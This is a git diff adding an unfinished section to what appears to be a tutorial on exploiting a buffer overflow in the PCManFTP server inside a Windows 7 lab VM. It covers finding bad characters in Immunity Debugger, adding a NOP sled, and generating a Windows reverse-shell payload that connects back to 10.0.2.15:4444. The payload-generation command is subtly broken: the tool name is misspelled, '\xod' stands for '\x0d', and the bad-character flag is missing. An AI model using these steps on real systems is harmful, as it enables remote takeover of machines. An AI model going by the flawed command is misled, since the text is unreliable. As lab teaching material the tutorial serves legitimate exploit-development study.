@@ -75,7 +75,46 @@ And in the upper part of the script we need to add:
 "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
 "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 `
+Now when we run the script we'll need to take a hard look at the bottom right quadrant of Immunity Debugger. We will be looking for bad characters that might make our exploit crash, \x00 is always a bad character, so we don't have that in our list - but we need to remember it for later. 
 
+Now we run the fuzzer5 script and then switch back to the WIN 7 VM. In Immunity Debugger, we need to scroll in the lower right pane until we reach the end of the A's we sent, and then past the return address we set. What we will see is something *like* this:
+
+`
+0012F564 04030201 xxxx
+0012F565 08000605 xxxx
+0012F566 12111009 xxxx
+...
+`
+
+What we need to look for is any missing number - in the example above the number 07 was replaced with 00 - that's a bad character and we need to make a note of it, and remove it from the badchar list in our script. We need to repeat this process until we don't have any more bad characters. In my example, I ran this 3 times and ended up with these bad characters: \x00\x0a\x0d,
+
+Once we know the bad characters, we can close Immunity Debugger and re-run the PCManFTP program by itself. Then we need to jump back to Kali and copy our fuzzer5 script to exploit.py:
+
+`cp fuzzer5.py exploit.py`
+
+We can delete all the badchar stuff now and then add some new variables to our script:
+
+`nop = "\x90" * 20
+buf = b""`
+
+In this case *nop* means no operation, we add 20 of these so the code has a buffer between our return address and the exploit code. The *buf* here is creating our exploit code - we will complete this after we create the code using MSVenom. The b"" means we are adding bytecode. For the rest of the exploit we will start each line with buff += b
+
+So let's create our exploit code, we do this by running:
+
+`msvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 "\x00\x0a\xod"`
+
+So let's break this down:
+  -msvenom 
+  -p 
+  -windows/shell_reverse_tcp 
+  -LHOST=10.0.2.15 
+  -LPORT=4444 
+  -EXITFUNC=thread 
+  -f 
+  -c 
+  -a 
+  -x86 
+  -"\x00\x0a\xod"
 
 *rest of article coming soon*
 
